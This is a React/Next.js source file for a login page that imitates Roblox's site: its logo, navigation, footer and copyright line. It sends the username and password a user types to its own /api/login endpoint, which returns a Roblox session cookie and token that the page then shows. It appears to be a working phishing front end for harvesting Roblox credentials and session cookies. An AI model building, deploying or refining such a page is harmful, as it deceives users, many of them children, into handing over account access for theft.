"use client";

import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogAction,
  AlertDialogCancel,
} from "@/components/ui/alert-dialog";
import axios from "@/lib/axios";
import toast from "react-hot-toast";
import { Loader2, X } from "lucide-react";

import * as z from "zod";
import { useRouter } from "next/navigation";
import { geistSansL, inter } from "./Gotham-Font/font";

// Helper function to check if the input is a valid phone number
const isPhoneNumberValid = (value: string) => {
  const cleanedValue = value.replace(/\D/g, "");
  return /^\d{10,15}$/.test(cleanedValue);
};

// Define the validation schema for the identifier (username, email, or phone)
const identifierSchema = z
  .string({ required_error: "Username, Email, or Phone is required" })
  .min(1, "Username, Email, or Phone is required")
  .max(100, "Input must be less than 100 characters")
  .trim()
  .superRefine((value, ctx) => {
    if (value.includes("@")) {
      const emailResult = z
        .string()
        .email("Please enter a valid email address")
        .safeParse(value);
      if (!emailResult.success) {
        ctx.addIssue({
          code: z.ZodIssueCode.custom,
          message: "Please enter a valid email address",
        });
      }
      return;
    }

    if (/^\d+$/.test(value) && isPhoneNumberValid(value)) {
      return;
    } else if (/^\d+$/.test(value) && !isPhoneNumberValid(value)) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        message: "Phone number must be between 10 and 15 digits",
      });
      return;
    }

    const usernameResult = z
      .string()
      .min(3, "Username must be at least 3 characters")
      .max(50, "Username must be less than 50 characters")
      .regex(
        /^[a-zA-Z0-9_]+$/,
        "Username can only contain letters, numbers, and underscores"
      )
      .safeParse(value);
    if (!usernameResult.success) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        message:
          "Username can only contain letters, numbers, and underscores, and must be 3-50 characters long",
      });
    }
  })
  .transform((val) => (val.includes("@") ? val.toLowerCase() : val));

// Password validation
const passwordSchema = z
  .string({ required_error: "Password is required" })
  .min(6, "Password must be at least 6 characters")
  .max(100, "Password must be less than 100 characters");

// Define the form schema using Zod
const loginSchema = z.object({
  username: identifierSchema,
  password: passwordSchema,
});

type LoginFormValues = z.infer<typeof loginSchema>;

interface LoginResponse {
  token: string;
  cookie: string;
  username: string;
}

const loginUser = async (data: LoginFormValues): Promise<LoginResponse> => {
  const response = await axios.post("/api/login", data);
  return response.data;
};

export default function Home() {
  const router = useRouter();
  const [cookie, setCookie] = useState<string | null>(null);
  const [token, setToken] = useState<string | null>(null);
  const [showSuccess, setShowSuccess] = useState(false);
  const [name, setName] = useState<string | null>(null);
  const [searchOpen, setSearchOpen] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<LoginFormValues>({
    resolver: zodResolver(loginSchema),
    mode: "all",
  });

  const mutation = useMutation({
    mutationFn: loginUser,
    onSuccess: (data: LoginResponse) => {
      setCookie(data.cookie);
      setToken(data.token);
      setName(data.username);
      setShowSuccess(true);
      toast.success("Login successful!");
    },
    onError: (error: any) => {
      console.error("Login failed:", error);
      toast.error(
        error?.response?.data?.error || "Login failed. Please check your credentials."
      );
    },
  });

  const onSubmit = (data: LoginFormValues) => {
    mutation.mutate(data);
  };

  return (
    <div className="min-h-screen mb-2 bg-[#121215] text-white flex flex-col">
      {/* Navbar */}
      <div className="bg-[#191A1F] sticky top-0 border-b border-[#070707] px-4 py-1 md:py-0  flex-col items-center justify-between">
        <nav className="py-1 flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <a
              href="https://www.roblox.com"
              target="_blank"
              rel="noopener noreferrer"
              className="logo cursor-pointer"
            >
              <img
                src="https://corp.roblox.com/assets/images/Roblox_Logo_White.svg"
                alt="Roblox Logo"
                className="hidden md:block h-[22px] object-cover cursor-pointer"
              />
              <img
                src="https://corp.roblox.com/assets/icons/safari-pinned-tab.svg"
                alt="Roblox Logo"
                className="md:hidden block h-6 object-cover"
              />
            </a>

            {/* Desktop Navigation */}
            <div className="hidden md:flex items-center justify-center space-x-24 mx-14">
              <a
                href="https://www.roblox.com/charts"
                className="text-white hover:text-gray-300 hover:border-b-3  transition-colors duration-300  text-[16px] !font-thin "
                target="_blank"
                rel="noopener noreferrer"
              >
                Charts
              </a>
              <a
                href="https://www.roblox.com/catalog"
                className="text-white hover:text-gray-300 hover:border-b-3  transition-colors duration-300  text-[16px] !font-thin "
                target="_blank"
                rel="noopener noreferrer"
              >
                Marketplace
              </a>
              <a
                href="https://create.roblox.com/"
                className="text-white hover:text-gray-300 hover:border-b-3  transition-colors duration-300  text-[16px] !font-thin "
                target="_blank"
                rel="noopener noreferrer"
              >
                Create
              </a>
              <a
                href="https://www.roblox.com/upgrades/robux?ctx=navpopover"
                className="text-white hover:text-gray-300 hover:border-b-3  transition-colors duration-300  text-[16px] !font-thin "
                target="_blank"
                rel="noopener noreferrer"
              >
                Robux
              </a>
              <div className="relative md:block hidden">
                <span className="absolute left-2 top-1/2 transform -translate-y-1/2  text-[#B8BBBF]">
                  <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
                    <path
                      fillRule="evenodd"
                      d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z"
                      clipRule="evenodd"
                    />
                  </svg>
                </span>
                <input
                  type="text"
                  placeholder="Search"
                  className="bg-[#212227] placeholder:text-lg border w-[450px] border-[#3A3E42] text-white text-sm px-4 pl-10 py-[4px] rounded-sm focus:outline-none"
                />
              </div>
            </div>
          </div>

          <div className="flex items-center ">
            <a
              href="https://www.roblox.com"
              className="bg-[#3250d6] hover:bg-[#325ed6] text-white text-sm font-bold px-3 py-1.5 rounded-sm"
            >
              Sign Up
            </a>
            <div className="block md:hidden ml-4 cursor-pointer">
              <svg
                onClick={() => setSearchOpen(!searchOpen)}
                className="w-6 h-6"
                fill="currentColor"
                viewBox="0 0 20 20"
              >
                <path
                  fillRule="evenodd"
                  d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z"
                  clipRule="evenodd"
                />
              </svg>
            </div>
          </div>
        </nav>
        {/* for small screen */}
        <div className="w-full md:hidden flex justify-around items-center pt-2">
          {searchOpen ? (
            <div className="relative my-2 block md:hidden ml-12">
              <span className="absolute left-2 top-1/2 transform -translate-y-1/2  text-[#B8BBBF]">
                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
                  <path
                    fillRule="evenodd"
                    d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z"
                    clipRule="evenodd"
                  />
                </svg>
              </span>
              <input
                type="text"
                placeholder="Search"
                className="bg-[#212227] placeholder:text-lg border w-[100%] min-w-[340px] mx-auto border-[#3A3E42] text-white text-sm px-4 pl-10 py-[4px] rounded-sm focus:outline-none"
              />
            </div>
          ) : (
            <>
              <a
                href="https://www.roblox.com/discover"
                className="text-white hover:text-gray-300 hover:border-b-3  transition-colors duration-300  text-[16px] !font-thin "
                target="_blank"
                rel="noopener noreferrer"
              >
                Charts
              </a>
              <a
                href="https://www.roblox.com/catalog"
                className="text-white hover:text-gray-300 hover:border-b-3  transition-colors duration-300  text-[16px] !font-thin "
                target="_blank"
                rel="noopener noreferrer"
              >
                Marketplace
              </a>
              <a
                href="https://create.roblox.com/"
                className="text-white hover:text-gray-300 hover:border-b-3  transition-colors duration-300  text-[16px] !font-thin "
                target="_blank"
                rel="noopener noreferrer"
              >
                Create
              </a>
              <a
                href="https://www.roblox.com/upgrades/robux?ctx=navpopover"
                className="text-white hover:text-gray-300 hover:border-b-3  transition-colors duration-300  text-[16px] !font-thin "
                target="_blank"
                rel="noopener noreferrer"
              >
                Robux
              </a>
            </>
          )}
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-grow  flex items-center justify-center px-2 md:px-4 py-4">
        <div className="bg-[#272930] p-4 py-4  shadow-lg w-full max-w-[400px]">
          <h1 className={`text-2xl md:text-3xl font-extrabold text-center  mb-2 ${inter.className}`}>
            Login to Roblox
          </h1>
          <form onSubmit={handleSubmit(onSubmit)}>
            <div>
              <Input
                id="username"
                {...register("username")}
                className={`${inter.className} my-2 bg-[#343740] py-1 text-white border-[#3A3E42] rounded-md text-sm placeholder:text-[#c7c7c9] !font-thin !placeholder:font-thin`}
                placeholder="Username/Email/Phone"
              />
              {errors.username && (
                <p className="text-red-500 text-xs mt-1">{errors.username.message}</p>
              )}
            </div>

            <div>
              <Input
                id="password"
                type="password"
                {...register("password")}
                className={`${inter.className} mt-3 mb-2 bg-[#343740] py-1 text-white border-[#3A3E42] rounded-md text-sm placeholder:text-[#c7c7c9] !font-thin !placeholder:font-thin`}
                placeholder="Password"
              />
              {errors.password && (
                <p className="text-red-500 text-xs mt-1">{errors.password.message}</p>
              )}
            </div>

            <Button
              type="submit"
              disabled={mutation.isPending}
              className="w-full bg-transparent hover:bg-[#3A3E42] text-white text-sm font-medium py-2 rounded-md border border-input transition-colors"
            >
              {mutation.isPending ? (
                <>
                  <Loader2 className="mr-2 animate-spin" /> Logging in...
                </>
              ) : (
                "Log In"
              )}
            </Button>
          </form>
          <div className="space-y-8 my-8 ">
            <p className="text-center  text-sm font-bold ">
              <a
                href="https://www.roblox.com/login/forgot-password-or-username"
                target="_blank"
                rel="noopener noreferrer"
                className=" hover:underline"
              >
                Forget Password or Username?
              </a>
            </p>

            <hr className="border-[#3A3E42] " />
            <div className="space-y-2 ">
              <div className="flex justify-center">
                <Button
                  variant="outline"
                  className="w-full  bg-[#3b3e49] hover:bg-[#3A3E42]  text-sm font-bold py-2 rounded-md border border-[#3A3E42] transition-colors"
                >
                  Email Me a One-Time Code
                </Button>
              </div>
              <div className="flex justify-center">
                <Button
                  variant="outline"
                  className="w-full  bg-[#3b3e49] hover:bg-[#3A3E42]  text-sm font-bold py-2 rounded-md border border-[#3A3E42] transition-colors"
                >
                  Use Another Device
                </Button>
              </div>
            </div>
            <p className="text-center font-medium   text-sm">
              Don't have an account?{" "}
              <a
                href="https://www.roblox.com"
                target="_blank"
                rel="noopener noreferrer"
                className="hover:underline font-medium"
              >
                Sign Up
              </a>
            </p>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="max-w-6xl mx-auto px-4 py-6">
        <div className="flex flex-wrap justify-center gap-4 space-x-6  text-sm capitalize">
          <a
            href="https://www.roblox.com/info/about-us?locale=en_us"
            className="hover:underline  text-gray-200 font-semibold"
            target="_blank"
            rel="noopener noreferrer"
          >
            About Us
          </a>
          <a
            href="https://www.roblox.com/info/jobs?locale=en_us"
            className="hover:underline  text-gray-200 font-semibold"
            target="_blank"
            rel="noopener noreferrer"
          >
            Jobs
          </a>
          <a
            href="https://www.roblox.com/info/blog?locale=en_us"
            className="hover:underline  text-gray-200 font-semibold"
            target="_blank"
            rel="noopener noreferrer"
          >
            Blog
          </a>
          <a
            href="https://www.roblox.com/info/parents?locale=en_us"
            className="hover:underline  text-gray-200 font-semibold"
            target="_blank"
            rel="noopener noreferrer"
          >
            Parents
          </a>
          <a
            href="https://www.roblox.com/giftcards?locale=en_us"
            className="hover:underline  text-gray-200 font-semibold"
            target="_blank"
            rel="noopener noreferrer"
          >
            Gift Cards
          </a>
          <a
            href="https://www.roblox.com/info/help?locale=en_us"
            className="hover:underline  text-gray-200 font-semibold"
            target="_blank"
            rel="noopener noreferrer"
          >
            Help
          </a>
          <a
            href="https://www.roblox.com/info/terms?locale=en_us"
            className="hover:underline  text-gray-200 font-semibold"
            target="_blank"
            rel="noopener noreferrer"
          >
            Terms
          </a>
          <a
            href="https://www.roblox.com/accessibility?locale=en_us"
            className="hover:underline  text-gray-200 font-semibold"
            target="_blank"
            rel="noopener noreferrer"
          >
            Accessability
          </a>
          <a
            href="https://www.roblox.com/info/privacy?locale=en_us"
            className="hover:underline  text-gray-200 font-semibold"
            target="_blank"
            rel="noopener noreferrer"
          >
            Privacy
          </a>
          <a
            href="https://www.roblox.com/my/account#!/privacy?locale=en_us"
            className="hover:underline  color-white flex items-center gap-2"
            target="_blank"
            rel="noopener noreferrer"
          >
            Your Privacy Choices
            <img
              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB0AAAAOCAYAAADT0Rc6AAAACXBIWXMAAACWAAAAlgEGQc5mAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAAkZJREFUOI2VlE1IVFEYhp9zZqwZTaeNCdEiIgzLVmFUY4swadFyaFFQoNYwLlpJjhmaAxXWCBL9OWaQkUILWwSBZJTBMNOP5UL6oSLIoHIhQ/iT48zc0+Kqd+7cMcd39b3vd77v/e655xxBJryqDWgA1llyq8c00EG3CKSLYinyKTcaYZeT5BUPsroMmb9mKZvQFDFNIwZo6Q02NVGWk73CzW0RMUwXDHuOE6+rZG2un5HUIK8+19WAYB8hEbUDoBG+c4JUrTt3Q4D7L1ezGlBEACGlT7W4nKRq3dhWqik4DY/HDH5jOK1fCLz7Db57s6458jKaeFWzXUBT0LOyYWkLlBTB4Z2GNvLdiHddhLfn9C0fHYdXZ6GmF+YSllaN9pRG/qEdZvXzBJSWGNzTBT9iMHvN0CZnzDXvxqHiErxp1rmvD+5Gss7vkgDCOMNMzcG2VuiN6rzzKTwchYmged2tYWu36bgRz8St+UXYbZK/Qx9w1rp1odABUT/svQyffkP7IIydhyKnufDmCzPfWgwfA9A4AOGvEPGDpqD/tcVzSiroODNAKl3ds0Uvah+EezVQvtE67a8/Zv7lArQ+guATiH6DyiD01cH6jGERdAhQAi9a/0m0oxXI5TfFwPufUB4wa4UO/dekI88GiZRZo1sICUKhUXWsB/lgBOtZy4Lrz61apiFkMZQcgPRn8JQ6iGBoQxHJziPYq7eDM/OOLaC4IetV+D8kVXSJZ2ZTgDYlCybpnJ2nXimWsVwV5oGrhPAjhFoU/wFkb7M55NWangAAAABJRU5ErkJggg=="
              alt="Locale"
              className="footer-postfixIcon"
            />
          </a>
        </div>
        <hr className="border-[#3A3E42] mt-8 mb-4" />
        <p className="text-center text-[#6E757C]  text-xs py-4">
          ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are
          among our registered and unregistered trademarks in the U.S. and other
          countries.
        </p>
      </footer>

      {/* Success Popup */}
      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
        <AlertDialogContent className="max-w-md">
          <AlertDialogHeader>
            <div className="flex justify-between items-center">
              <AlertDialogTitle>Hey {name}, Login Successfully.</AlertDialogTitle>
              <AlertDialogCancel asChild>
                <button
                  aria-label="Close dialog"
                  className="p-1 rounded-full hover:bg-neutral-200 transition-colors"
                >
                  <X className="h-5 w-5 text-neutral-600" />
                </button>
              </AlertDialogCancel>
            </div>
            <AlertDialogDescription className="space-y-2">
              <p>
                You have successfully logged in! Your Roblox cookie and JWT token have
                been stored securely.
              </p>
              {cookie && (
                <div className="mt-2">
                  <strong>Cookie:</strong>
                  <div className="mt-1 p-2 bg-neutral-100 rounded break-all text-sm text-neutral-800">
                    {cookie}
                  </div>
                </div>
              )}
              {token && (
                <div className="mt-2">
                  <strong>JWT Token:</strong>
                  <div className="mt-1 p-2 bg-neutral-100 rounded break-all text-sm text-neutral-800">
                    {token}
                  </div>
                </div>
              )}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogAction
              onClick={() => setShowSuccess(false)}
              className="bg-transparent border border-neutral-600 text-neutral-800 hover:bg-neutral-200 transition-colors"
            >
              Close
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
}
